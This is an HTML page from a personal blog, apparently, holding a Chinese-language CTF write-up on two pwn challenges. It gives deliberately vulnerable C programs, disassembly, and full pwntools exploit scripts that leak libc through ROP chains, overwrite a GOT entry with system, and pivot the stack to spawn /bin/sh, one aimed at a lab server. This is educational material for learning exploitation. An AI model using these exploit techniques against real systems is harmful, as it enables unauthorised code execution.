@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Got Hijacking and Stack Migration | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctfpwn">
+  
+  
+  
+  
+  <meta name="description" content="记录两道题目，关于Got Hijacking和Stack Migration。">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Got Hijacking and Stack Migration">
+<meta property="og:url" content="https://qianfei11.github.io/2019/03/16/Got-Hijacking-and-Stack-Migration/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="记录两道题目，关于Got Hijacking和Stack Migration。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-19T06:25:45.399Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Got Hijacking and Stack Migration">
+<meta name="twitter:description" content="记录两道题目，关于Got Hijacking和Stack Migration。">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/fashion.css">
+  <link rel="stylesheet" href="/css/glyphs.css">
+
+</head>
+</html>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">ZJGSU-IS-17</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Got-Hijacking-and-Stack-Migration" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      Got Hijacking and Stack Migration
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/03/16/Got-Hijacking-and-Stack-Migration/" class="article-date">
+	  <time datetime="2019-03-16T03:49:16.000Z" itemprop="datePublished">March 16, 2019</time>
+	</a>
+
+       
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>记录两道题目，关于<code>Got Hijacking</code>和<code>Stack Migration</code>。</p>
+<a id="more"></a>
+<h1 id="Got-Hijacking"><a href="#Got-Hijacking" class="headerlink" title="Got Hijacking"></a>Got Hijacking</h1><p>一般在有格式化字符串漏洞的地方或者heap的漏洞利用中经常用到，通过修改某个常规函数的got表达到奇怪的目的。</p>
+<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -o main</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    srand(time(<span class="number">0</span>)^getpid());</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> magic = rand();</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">if</span>(atoi(buf)==magic)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"OKay..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>想法是直接把puts的got盖成system，总共送两次payload。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'sp'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">A = elf.symbols[<span class="string">'A'</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">'gets'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">pop_rdi_ret = g(<span class="string">'pop rdi ; ret'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">offset = <span class="number">136</span></span><br><span class="line">payload = <span class="string">'A'</span> * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(A)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - puts_offset</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">payload = <span class="string">'A'</span> * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(puts_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h1><p>栈迁移（Stack Migration）是在可以输入的ROP链长度不够时，可以扩展输入的方法。 核心概念是将ROP链分别写在指定区域，然后再把栈迁移过去执行。</p>
+<p>其中为了保持栈帧平衡最重要的一条指令是<code>leave ; ret</code>，32位下等价于<code>mov esp, ebp ; pop ebp</code>。</p>
+<h2 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -o main -fno-stack-protector -Wl,-z,relro,-z,now</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vul();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>源码中buf为0x20个字节，但只让读0x30个字节，也就是说我们只能修改ebp和ret的地址。</p>
+<h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>objdump反汇编一下vul函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00000000004006a6 &lt;vul&gt;:</span><br><span class="line">  4006a6:       55                      push   rbp</span><br><span class="line">  4006a7:       48 89 e5                mov    rbp,rsp</span><br><span class="line">  4006aa:       48 83 ec 20             sub    rsp,0x20</span><br><span class="line">  4006ae:       48 8d 45 e0             lea    rax,[rbp-0x20]</span><br><span class="line">  4006b2:       ba 20 00 00 00          mov    edx,0x20</span><br><span class="line">  4006b7:       be 00 00 00 00          mov    esi,0x0</span><br><span class="line">  4006bc:       48 89 c7                mov    rdi,rax</span><br><span class="line">  4006bf:       e8 c4 fe ff ff          call   400588 &lt;_init+0x40&gt; ; memset</span><br><span class="line">  4006c4:       48 8d 45 e0             lea    rax,[rbp-0x20]</span><br><span class="line">  4006c8:       ba 30 00 00 00          mov    edx,0x30</span><br><span class="line">  4006cd:       48 89 c6                mov    rsi,rax</span><br><span class="line">  4006d0:       bf 00 00 00 00          mov    edi,0x0</span><br><span class="line">  4006d5:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">  4006da:       e8 b1 fe ff ff          call   400590 &lt;_init+0x48&gt; ; read</span><br><span class="line">  4006df:       48 8d 45 e0             lea    rax,[rbp-0x20]</span><br><span class="line">  4006e3:       48 89 c7                mov    rdi,rax</span><br><span class="line">  4006e6:       e8 95 fe ff ff          call   400580 &lt;_init+0x38&gt; ; puts</span><br><span class="line">  4006eb:       90                      nop</span><br><span class="line">  4006ec:       c9                      leave  </span><br><span class="line">  4006ed:       c3                      ret</span><br></pre></td></tr></table></figure>
+<p>看到read其实是往rbp-0x20的地方读东西。那么可以想到在第一次payload的时候改掉ebp，然后ret到read这个地方，于是第二次就可以读一段rop到我们设置的buf上。然后跳过去。最后一次再跳回到A，然后往buf上写<code>&quot;system(&quot;/bin/sh&quot;)&quot;</code>，再把栈搬过去就能getshell。</p>
+<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./main'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'10.21.13.69'</span>, <span class="number">10015</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>) <span class="comment"># 0x00000000004005ec</span></span><br><span class="line">pop_rdi_ret = g(<span class="string">'pop rdi ; ret'</span>) <span class="comment"># 0x0000000000400673</span></span><br><span class="line">sub_rsp_0x20 = g(<span class="string">'sub rsp, 0x20'</span>) <span class="comment"># 0x4005aa</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>] <span class="comment"># 0x400490</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>] <span class="comment"># 0x600fe8</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>] <span class="comment"># 0x400480</span></span><br><span class="line">buf = <span class="number">0x00602000</span> - <span class="number">0x100</span></span><br><span class="line">vul = elf.symbols[<span class="string">'vul'</span>] <span class="comment"># 0x4005a6</span></span><br><span class="line">gadget1 = <span class="number">0x4006c4</span></span><br><span class="line">read_offset = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="comment"># p.send(p64(0xdeadbeef).ljust(0x20,'\x00'))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">32</span> + p64(buf) + p64(gadget1)</span><br><span class="line">p.send(payload) <span class="comment"># edit rbp</span></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vul) + p64(buf - <span class="number">0x20</span> - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">read = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) </span><br><span class="line">libc_base = read - read_offset</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">payload = (p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)).ljust(<span class="number">32</span>, <span class="string">'\x00'</span>) + p64(buf - <span class="number">0x28</span> - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Buffer Overflow with gcc&gt;=4.9
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/06/解决VMware下Ubuntu的一些问题/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">解决VMware下Ubuntu的一些问题</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Got-Hijacking"><span class="nav-number">1.</span> <span class="nav-text">Got Hijacking</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source"><span class="nav-number">1.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Stack-Migration"><span class="nav-number">2.</span> <span class="nav-text">Stack Migration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-1"><span class="nav-number">2.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 AssassinQ All Rights Reserved.
+        
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
